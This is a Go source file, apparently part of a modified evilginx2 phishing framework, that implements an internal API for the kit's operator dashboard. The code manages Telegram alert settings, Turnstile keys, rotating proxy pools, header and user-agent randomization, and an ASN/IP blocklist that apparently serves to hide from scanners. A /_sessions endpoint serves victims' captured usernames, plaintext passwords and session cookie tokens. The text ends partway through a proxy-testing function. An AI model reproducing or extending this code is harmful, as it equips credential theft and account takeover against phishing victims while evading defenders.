package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// InternalAPI provides an HTTP-only API server for internal communication
// This server binds ONLY to localhost (127.0.0.1) and does not use TLS
// It's designed for EvilFeed and other local services to communicate with Evilginx
type InternalAPI struct {
	server  *http.Server
	router  *mux.Router
	cfg     *Config
	db      *database.Database
	port    int
	running bool
	mtx     sync.Mutex

	// Callback functions to interact with HttpProxy
	getTelegramConfig  func() *TelegramConfig
	setTelegramConfig  func(botToken, chatId string, enabled *bool) error
	getTurnstileConfig func() *TurnstileConfig
	setTurnstileConfig func(siteKey, secretKey string, enabled *bool) error
	getProxyConfig     func() *ProxyConfig
	setProxyConfig     func(cfg *ProxyConfig) error

	// Additional config callbacks
	getAnonymityConfig      func() *AnonymityConfigPersist
	setAnonymityConfig      func(enabled, headerRandomization, userAgentRotation *bool) error
	getCloudflareConfig     func() *CloudflareConfig
	setCloudflareConfig     func(apiToken string, wildcardEnabled *bool) error
	getRequestCheckerConfig func() *RequestCheckerConfig
	setRequestCheckerConfig func(cfg *RequestCheckerConfig) error
}

// Note: TelegramConfig, TurnstileConfig, and ProxyConfig types are defined in config.go

// NewInternalAPI creates a new internal API server
func NewInternalAPI(cfg *Config, db *database.Database, hp *HttpProxy) *InternalAPI {
	api := &InternalAPI{
		port:   cfg.GetInternalAPIPort(),
		cfg:    cfg,
		db:     db,
		router: mux.NewRouter(),
	}
	api.setupRoutes()
	return api
}

// SetTelegramCallbacks sets the callback functions for Telegram config
func (api *InternalAPI) SetTelegramCallbacks(
	getConfig func() *TelegramConfig,
	setConfig func(botToken, chatId string, enabled *bool) error,
) {
	api.getTelegramConfig = getConfig
	api.setTelegramConfig = setConfig
}

// SetTurnstileCallbacks sets the callback functions for Turnstile config
func (api *InternalAPI) SetTurnstileCallbacks(
	getConfig func() *TurnstileConfig,
	setConfig func(siteKey, secretKey string, enabled *bool) error,
) {
	api.getTurnstileConfig = getConfig
	api.setTurnstileConfig = setConfig
}

// SetProxyCallbacks sets the callback functions for Proxy config
func (api *InternalAPI) SetProxyCallbacks(
	getConfig func() *ProxyConfig,
	setConfig func(cfg *ProxyConfig) error,
) {
	api.getProxyConfig = getConfig
	api.setProxyConfig = setConfig
}

// SetAnonymityCallbacks sets the callback functions for Anonymity config
func (api *InternalAPI) SetAnonymityCallbacks(
	getConfig func() *AnonymityConfigPersist,
	setConfig func(enabled, headerRandomization, userAgentRotation *bool) error,
) {
	api.getAnonymityConfig = getConfig
	api.setAnonymityConfig = setConfig
}

// SetCloudflareCallbacks sets the callback functions for Cloudflare config
func (api *InternalAPI) SetCloudflareCallbacks(
	getConfig func() *CloudflareConfig,
	setConfig func(apiToken string, wildcardEnabled *bool) error,
) {
	api.getCloudflareConfig = getConfig
	api.setCloudflareConfig = setConfig
}

// SetRequestCheckerCallbacks sets the callback functions for RequestChecker (blocklist) config
func (api *InternalAPI) SetRequestCheckerCallbacks(
	getConfig func() *RequestCheckerConfig,
	setConfig func(cfg *RequestCheckerConfig) error,
) {
	api.getRequestCheckerConfig = getConfig
	api.setRequestCheckerConfig = setConfig
}

// setupRoutes configures all API endpoints
func (api *InternalAPI) setupRoutes() {
	// Health check
	api.router.HandleFunc("/_health", api.handleHealth).Methods("GET")

	// Telegram config
	api.router.HandleFunc("/_telegram/config", api.handleTelegramConfig).Methods("GET", "POST")

	// Turnstile config
	api.router.HandleFunc("/_turnstile/config", api.handleTurnstileConfig).Methods("GET", "POST")

	// Proxy config (single proxy - legacy)
	api.router.HandleFunc("/_proxy/config", api.handleProxyConfig).Methods("GET", "POST")

	// Proxy Pool API (session-sticky rotation)
	api.router.HandleFunc("/_proxy/pool", api.handleProxyPool).Methods("GET", "POST")
	api.router.HandleFunc("/_proxy/pool/stats", api.handleProxyPoolStats).Methods("GET")
	api.router.HandleFunc("/_proxy/pool/import", api.handleProxyBulkImport).Methods("POST")
	api.router.HandleFunc("/_proxy/pool/test-all", api.handleProxyPoolTestAll).Methods("POST")
	api.router.HandleFunc("/_proxy/pool/clear-failed", api.handleProxyPoolClearFailed).Methods("POST")
	api.router.HandleFunc("/_proxy/test", api.handleProxyTest).Methods("POST")

	// Anonymity config
	api.router.HandleFunc("/_anonymity/config", api.handleAnonymityConfig).Methods("GET", "POST")

	// Cloudflare config
	api.router.HandleFunc("/_cloudflare/config", api.handleCloudflareConfig).Methods("GET", "POST")

	// RequestChecker (blocklist) config
	api.router.HandleFunc("/_blocklist/config", api.handleBlocklistConfig).Methods("GET", "POST")

	// Sessions API
	api.router.HandleFunc("/_sessions", api.handleSessions).Methods("GET")

	// Catch-all for unknown endpoints
	api.router.PathPrefix("/").HandlerFunc(api.handleNotFound)
}

// Start starts the internal API server
func (api *InternalAPI) Start() error {
	api.mtx.Lock()
	defer api.mtx.Unlock()

	if api.running {
		return fmt.Errorf("internal API server already running")
	}

	// Bind ONLY to localhost for security
	addr := fmt.Sprintf("127.0.0.1:%d", api.port)

	api.server = &http.Server{
		Addr:         addr,
		Handler:      api.router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	// Create listener explicitly bound to localhost
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to bind internal API to %s: %v", addr, err)
	}

	go func() {
		log.Important("🔌 Internal API Server started on http://%s", addr)
		log.Info("   Endpoints: /_telegram/config, /_turnstile/config, /_proxy/config, /_sessions")
		if err := api.server.Serve(listener); err != nil && err != http.ErrServerClosed {
			log.Error("Internal API Server error: %v", err)
		}
	}()

	api.running = true
	return nil
}

// Stop stops the internal API server
func (api *InternalAPI) Stop() {
	api.mtx.Lock()
	defer api.mtx.Unlock()

	if api.server != nil && api.running {
		api.server.Close()
		api.running = false
		log.Info("Internal API Server stopped")
	}
}

// IsRunning returns whether the server is running
func (api *InternalAPI) IsRunning() bool {
	api.mtx.Lock()
	defer api.mtx.Unlock()
	return api.running
}

// GetPort returns the port the server is running on
func (api *InternalAPI) GetPort() int {
	return api.port
}

// --- HTTP Handlers ---

func (api *InternalAPI) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "ok",
		"service": "evilginx-internal-api",
		"port":    api.port,
	})
}

func (api *InternalAPI) handleTelegramConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getTelegramConfig == nil {
			// Fallback to config
			tcfg := api.cfg.GetTelegramConfig()
			json.NewEncoder(w).Encode(TelegramConfig{
				BotToken: tcfg.BotToken,
				ChatId:   tcfg.ChatId,
				Enabled:  tcfg.Enabled,
			})
			return
		}
		cfg := api.getTelegramConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			BotToken string `json:"bot_token"`
			ChatId   string `json:"chat_id"`
			Enabled  *bool  `json:"enabled"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setTelegramConfig != nil {
			if err := api.setTelegramConfig(req.BotToken, req.ChatId, req.Enabled); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.BotToken != "" {
				api.cfg.SetTelegramBotToken(req.BotToken)
			}
			if req.ChatId != "" {
				api.cfg.SetTelegramChatId(req.ChatId)
			}
			if req.Enabled != nil {
				api.cfg.SetTelegramEnabled(*req.Enabled)
			}
		}

		log.Info("internal-api: Telegram config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleTurnstileConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getTurnstileConfig == nil {
			// Fallback to config
			tcfg := api.cfg.GetTurnstileConfig()
			json.NewEncoder(w).Encode(TurnstileConfig{
				SiteKey:   tcfg.SiteKey,
				SecretKey: tcfg.SecretKey,
				Enabled:   tcfg.Enabled,
			})
			return
		}
		cfg := api.getTurnstileConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			SiteKey   string `json:"sitekey"`
			SecretKey string `json:"secretkey"`
			Enabled   *bool  `json:"enabled"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setTurnstileConfig != nil {
			if err := api.setTurnstileConfig(req.SiteKey, req.SecretKey, req.Enabled); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.SiteKey != "" {
				api.cfg.SetTurnstileSiteKey(req.SiteKey)
			}
			if req.SecretKey != "" {
				api.cfg.SetTurnstileSecretKey(req.SecretKey)
			}
			if req.Enabled != nil {
				api.cfg.SetTurnstileEnabled(*req.Enabled)
			}
		}

		log.Info("internal-api: Turnstile config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleProxyConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getProxyConfig == nil {
			// Fallback to config
			proxyType := api.cfg.proxyConfig.Type
			if proxyType == "" {
				proxyType = "socks5"
			}
			json.NewEncoder(w).Encode(ProxyConfig{
				Type:     proxyType,
				Address:  api.cfg.proxyConfig.Address,
				Port:     api.cfg.proxyConfig.Port,
				Username: api.cfg.proxyConfig.Username,
				Password: "", // Don't expose password
				Enabled:  api.cfg.proxyConfig.Enabled,
			})
			return
		}
		cfg := api.getProxyConfig()
		cfg.Password = "" // Don't expose password in GET
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req ProxyConfig
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setProxyConfig != nil {
			if err := api.setProxyConfig(&req); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.Type != "" {
				api.cfg.SetProxyType(req.Type)
			}
			if req.Address != "" {
				api.cfg.SetProxyAddress(req.Address)
			}
			if req.Port > 0 {
				api.cfg.SetProxyPort(req.Port)
			}
			if req.Username != "" {
				api.cfg.SetProxyUsername(req.Username)
			}
			if req.Password != "" {
				api.cfg.SetProxyPassword(req.Password)
			}
			api.cfg.EnableProxy(req.Enabled)
		}

		log.Info("internal-api: Proxy config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleSessions(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	// Get all sessions from database
	sessions, err := api.db.ListSessions()
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"failed to list sessions: %s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	// Convert to JSON-friendly format
	type SessionResponse struct {
		ID         int               `json:"id"`
		Phishlet   string            `json:"phishlet"`
		Username   string            `json:"username"`
		Password   string            `json:"password"`
		SessionID  string            `json:"session_id"`
		RemoteAddr string            `json:"remote_addr"`
		UserAgent  string            `json:"useragent"`
		Tokens     string            `json:"tokens"`
		Custom     map[string]string `json:"custom"`
		CreateTime int64             `json:"create_time"`
		UpdateTime int64             `json:"update_time"`
		LandingURL string            `json:"landing_url"`
	}

	var response []SessionResponse
	for _, s := range sessions {
		// Convert CookieTokens to JSON string
		tokensJSON := ""
		if len(s.CookieTokens) > 0 {
			if data, err := json.Marshal(s.CookieTokens); err == nil {
				tokensJSON = string(data)
			}
		}

		response = append(response, SessionResponse{
			ID:         s.Id,
			Phishlet:   s.Phishlet,
			Username:   s.Username,
			Password:   s.Password,
			SessionID:  s.SessionId,
			RemoteAddr: s.RemoteAddr,
			UserAgent:  s.UserAgent,
			Tokens:     tokensJSON,
			Custom:     s.Custom,
			CreateTime: s.CreateTime,
			UpdateTime: s.UpdateTime,
			LandingURL: s.LandingURL,
		})
	}

	json.NewEncoder(w).Encode(response)
}

func (api *InternalAPI) handleNotFound(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusNotFound)
	json.NewEncoder(w).Encode(map[string]string{
		"error": "endpoint not found",
		"path":  r.URL.Path,
		"hint":  "Available endpoints: /_health, /_telegram/config, /_turnstile/config, /_proxy/config, /_anonymity/config, /_cloudflare/config, /_blocklist/config, /_sessions",
	})
}

func (api *InternalAPI) handleAnonymityConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getAnonymityConfig == nil {
			// Fallback to config
			acfg := api.cfg.GetAnonymityConfig()
			json.NewEncoder(w).Encode(AnonymityConfigPersist{
				Enabled:             acfg.Enabled,
				HeaderRandomization: acfg.HeaderRandomization,
				UserAgentRotation:   acfg.UserAgentRotation,
			})
			return
		}
		cfg := api.getAnonymityConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			Enabled             *bool `json:"enabled"`
			HeaderRandomization *bool `json:"header_randomization"`
			UserAgentRotation   *bool `json:"useragent_rotation"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setAnonymityConfig != nil {
			if err := api.setAnonymityConfig(req.Enabled, req.HeaderRandomization, req.UserAgentRotation); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.Enabled != nil {
				api.cfg.SetAnonymityEnabled(*req.Enabled)
			}
			if req.HeaderRandomization != nil {
				api.cfg.SetAnonymityHeaderRandomization(*req.HeaderRandomization)
			}
			if req.UserAgentRotation != nil {
				api.cfg.SetAnonymityUserAgentRotation(*req.UserAgentRotation)
			}
		}

		log.Info("internal-api: Anonymity config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleCloudflareConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getCloudflareConfig == nil {
			// Fallback to config
			ccfg := api.cfg.GetCloudflareConfig()
			json.NewEncoder(w).Encode(CloudflareConfig{
				APIToken:        ccfg.APIToken,
				WildcardEnabled: ccfg.WildcardEnabled,
			})
			return
		}
		cfg := api.getCloudflareConfig()
		// Mask API token for security (show only last 4 chars)
		maskedToken := ""
		if cfg.APIToken != "" {
			if len(cfg.APIToken) > 4 {
				maskedToken = "****" + cfg.APIToken[len(cfg.APIToken)-4:]
			} else {
				maskedToken = "****"
			}
		}
		json.NewEncoder(w).Encode(map[string]interface{}{
			"api_token":        maskedToken,
			"wildcard_enabled": cfg.WildcardEnabled,
			"has_token":        cfg.APIToken != "",
		})
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			APIToken        string `json:"api_token"`
			WildcardEnabled *bool  `json:"wildcard_enabled"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setCloudflareConfig != nil {
			if err := api.setCloudflareConfig(req.APIToken, req.WildcardEnabled); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.APIToken != "" {
				api.cfg.SetCloudflareAPIToken(req.APIToken)
			}
			if req.WildcardEnabled != nil {
				api.cfg.SetCloudflareWildcardEnabled(*req.WildcardEnabled)
			}
		}

		log.Info("internal-api: Cloudflare config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleBlocklistConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getRequestCheckerConfig == nil {
			// Fallback to config
			rcfg := api.cfg.GetRequestCheckerConfig()
			json.NewEncoder(w).Encode(RequestCheckerConfig{
				Enabled:       rcfg.Enabled,
				ASNFile:       rcfg.ASNFile,
				UserAgentFile: rcfg.UserAgentFile,
				IPRangeFile:   rcfg.IPRangeFile,
				IPListFile:    rcfg.IPListFile,
				Verbose:       rcfg.Verbose,
			})
			return
		}
		cfg := api.getRequestCheckerConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			Enabled       *bool  `json:"enabled"`
			ASNFile       string `json:"asn_file"`
			UserAgentFile string `json:"useragent_file"`
			IPRangeFile   string `json:"ip_range_file"`
			IPListFile    string `json:"ip_list_file"`
			Verbose       *bool  `json:"verbose"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setRequestCheckerConfig != nil {
			cfg := &RequestCheckerConfig{
				ASNFile:       req.ASNFile,
				UserAgentFile: req.UserAgentFile,
				IPRangeFile:   req.IPRangeFile,
				IPListFile:    req.IPListFile,
			}
			if req.Enabled != nil {
				cfg.Enabled = *req.Enabled
			}
			if req.Verbose != nil {
				cfg.Verbose = *req.Verbose
			}
			if err := api.setRequestCheckerConfig(cfg); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.Enabled != nil {
				api.cfg.SetRequestCheckerEnabled(*req.Enabled)
			}
			if req.ASNFile != "" {
				api.cfg.SetRequestCheckerASNFile(req.ASNFile)
			}
			if req.UserAgentFile != "" {
				api.cfg.SetRequestCheckerUserAgentFile(req.UserAgentFile)
			}
			if req.IPRangeFile != "" {
				api.cfg.SetRequestCheckerIPRangeFile(req.IPRangeFile)
			}
			if req.IPListFile != "" {
				api.cfg.SetRequestCheckerIPListFile(req.IPListFile)
			}
			if req.Verbose != nil {
				api.cfg.SetRequestCheckerVerbose(*req.Verbose)
			}
		}

		log.Info("internal-api: Blocklist (RequestChecker) config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

// ============================================
// PROXY POOL API HANDLERS (Session-Sticky Rotation)
// ============================================

// ProxyPoolConfig represents the proxy pool configuration for API
type ProxyPoolConfig struct {
	Enabled bool        `json:"enabled"`
	Proxies []ProxyInfo `json:"proxies"`
}

// Callback functions for proxy pool (set by HttpProxy)
var (
	getProxyPoolFunc func() *ProxyPoolConfig
	setProxyPoolFunc func(pool *ProxyPoolConfig) error
	getPoolStatsFunc func() map[string]interface{}
	testProxyFunc    func(proxy *ProxyInfo) (bool, string, error)
)

// SetProxyPoolCallbacks sets the callback functions for proxy pool management
func SetProxyPoolCallbacks(
	getPool func() *ProxyPoolConfig,
	setPool func(pool *ProxyPoolConfig) error,
	getStats func() map[string]interface{},
	testProxy func(proxy *ProxyInfo) (bool, string, error),
) {
	getProxyPoolFunc = getPool
	setProxyPoolFunc = setPool
	getPoolStatsFunc = getStats
	testProxyFunc = testProxy
}

func (api *InternalAPI) handleProxyPool(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		// Return the current proxy pool
		if getProxyPoolFunc == nil {
			json.NewEncoder(w).Encode(ProxyPoolConfig{
				Enabled: false,
				Proxies: []ProxyInfo{},
			})
			return
		}
		pool := getProxyPoolFunc()

		// Create response with latency in milliseconds (not nanoseconds)
		type ProxyInfoResponse struct {
			Type        string  `json:"type"`
			Host        string  `json:"host"`
			Port        int     `json:"port"`
			Username    string  `json:"username,omitempty"`
			Password    string  `json:"password,omitempty"`
			Country     string  `json:"country,omitempty"`
			Region      string  `json:"region,omitempty"`
			SuccessRate float64 `json:"success_rate"`
			Latency     int64   `json:"latency"` // milliseconds
			Active      bool    `json:"active"`
			InUse       bool    `json:"in_use"`
			SessionID   string  `json:"session_id,omitempty"`
			Status      string  `json:"status,omitempty"`
		}
		type PoolResponse struct {
			Enabled bool                `json:"enabled"`
			Proxies []ProxyInfoResponse `json:"proxies"`
		}

		resp := PoolResponse{
			Enabled: pool.Enabled,
			Proxies: make([]ProxyInfoResponse, len(pool.Proxies)),
		}

		for i, p := range pool.Proxies {
			password := ""
			if p.Password != "" {
				password = "********"
			}
			resp.Proxies[i] = ProxyInfoResponse{
				Type:        p.Type,
				Host:        p.Host,
				Port:        p.Port,
				Username:    p.Username,
				Password:    password,
				Country:     p.Country,
				Region:      p.Region,
				SuccessRate: p.SuccessRate,
				Latency:     p.Latency.Milliseconds(), // Convert to milliseconds
				Active:      p.Active,
				InUse:       p.InUse,
				SessionID:   p.SessionID,
				Status:      p.Status,
			}
		}
		json.NewEncoder(w).Encode(resp)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		// Parse as a map first to check what fields are provided
		var rawReq map[string]interface{}
		if err := json.Unmarshal(body, &rawReq); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		if setProxyPoolFunc == nil || getProxyPoolFunc == nil {
			http.Error(w, `{"error":"proxy pool not initialized"}`, http.StatusServiceUnavailable)
			return
		}

		// Get current pool
		currentPool := getProxyPoolFunc()
		if currentPool == nil {
			currentPool = &ProxyPoolConfig{Enabled: false, Proxies: []ProxyInfo{}}
		}

		// Check if this is just an enable/disable toggle (no proxies field provided)
		_, hasProxies := rawReq["proxies"]
		if !hasProxies {
			// Only update enabled field, preserve existing proxies
			if enabled, ok := rawReq["enabled"].(bool); ok {
				currentPool.Enabled = enabled
				if err := setProxyPoolFunc(currentPool); err != nil {
					http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
					return
				}
				log.Info("internal-api: Proxy pool enabled=%v (preserved %d proxies)", enabled, len(currentPool.Proxies))
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": true,
					"enabled": enabled,
					"count":   len(currentPool.Proxies),
				})
				return
			}
		}

		// Full pool update - parse the complete config
		var pool ProxyPoolConfig
		if err := json.Unmarshal(body, &pool); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		if err := setProxyPoolFunc(&pool); err != nil {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
			return
		}

		log.Info("internal-api: Proxy pool updated with %d proxies (enabled: %v)", len(pool.Proxies), pool.Enabled)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"count":   len(pool.Proxies),
		})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleProxyPoolStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	if getPoolStatsFunc == nil {
		json.NewEncoder(w).Encode(map[string]interface{}{
			"total":     0,
			"active":    0,
			"in_use":    0,
			"available": 0,
			"failed":    0,
		})
		return
	}

	stats := getPoolStatsFunc()
	json.NewEncoder(w).Encode(stats)
}

// handleProxyBulkImport handles bulk proxy import with flexible format parsing
// POST /_proxy/pool/import
// Body: { "proxy_type": "socks5", "lines": ["host:port", "host|port|user|pass", ...] }
func (api *InternalAPI) handleProxyBulkImport(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var req BulkImportRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
		return
	}

	// Validate proxy type
	validTypes := map[string]bool{
		"socks5":  true,
		"socks5h": true,
		"socks4":  true,
		"http":    true,
		"https":   true,
	}

	proxyType := strings.ToLower(req.ProxyType)
	if proxyType == "" {
		proxyType = "socks5" // Default
	}

	if !validTypes[proxyType] {
		http.Error(w, fmt.Sprintf(`{"error":"invalid proxy_type: %s. Valid types: socks5, socks5h, socks4, http, https"}`, req.ProxyType), http.StatusBadRequest)
		return
	}

	if len(req.Lines) == 0 {
		http.Error(w, `{"error":"no proxy lines provided"}`, http.StatusBadRequest)
		return
	}

	// Parse the proxies
	result, err := ParseBulkProxies(req.Lines, proxyType)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	// Actually add the parsed proxies to the pool
	if len(result.Proxies) > 0 && setProxyPoolFunc != nil {
		// Get current pool first
		var currentPool *ProxyPoolConfig
		if getProxyPoolFunc != nil {
			currentPool = getProxyPoolFunc()
		}
		if currentPool == nil {
			currentPool = &ProxyPoolConfig{Enabled: false, Proxies: []ProxyInfo{}}
		}

		// Append new proxies to existing pool
		currentPool.Proxies = append(currentPool.Proxies, result.Proxies...)

		// Save the updated pool
		if err := setProxyPoolFunc(currentPool); err != nil {
			log.Error("internal-api: Failed to save proxy pool: %v", err)
			http.Error(w, fmt.Sprintf(`{"error":"failed to save proxy pool: %s"}`, err.Error()), http.StatusInternalServerError)
			return
		}

		log.Info("internal-api: Bulk import added %d proxies to pool (total: %d)", len(result.Proxies), len(currentPool.Proxies))
	}

	log.Info("internal-api: Bulk import parsed %d proxies (%d failed) with type %s", result.Imported, result.Failed, proxyType)
	json.NewEncoder(w).Encode(result)
}

func (api *InternalAPI) handleProxyTest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var proxy ProxyInfo
	if err := json.Unmarshal(body, &proxy); err != nil {
		http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
		return
	}

	// Validate required fields
	if proxy.Host == "" || proxy.Port == 0 {
		http.Error(w, `{"error":"host and port are required"}`, http.StatusBadRequest)
		return
	}

	if proxy.Type == "" {
		proxy.Type = "socks5" // Default to SOCKS5
	}

	// Test the proxy
	if testProxyFunc != nil {
		success, originIP, err := testProxyFunc(&proxy)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success":   false,
				"error":     err.Error(),
				"origin_ip": "",
			})
			return
		}
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":   success,
			"origin_ip": originIP,
			"error":     "",
		})
		return
	}

	// Fallback: test proxy directly
	success, originIP, latencyMs := testProxyDirect(&proxy)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":    success,
		"origin_ip":  originIP,
		"latency_ms": latencyMs,
	})
}

// testProxyDirect tests a proxy by making a request to httpbin.org/ip
// testProxyDirect tests a proxy by making a request to httpbin.org/ip
// Returns: success, originIP, latencyMs
func testProxyDirect(proxy *ProxyInfo) (bool, string, int64) {
	import_url := fmt.Sprintf("%s://%s:%d", proxy.Type, proxy.Host, proxy.Port)
	if proxy.Username != "" && proxy.Password != "" {
		import_url = fmt.Sprintf("%s://%s:%s@%s:%d", proxy.Type, proxy.Username, proxy.Password, proxy.Host, proxy.Port)
	}

	proxyURL, err := parseProxyURL(import_url)
	if err != nil {
		return false, "", 0
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}

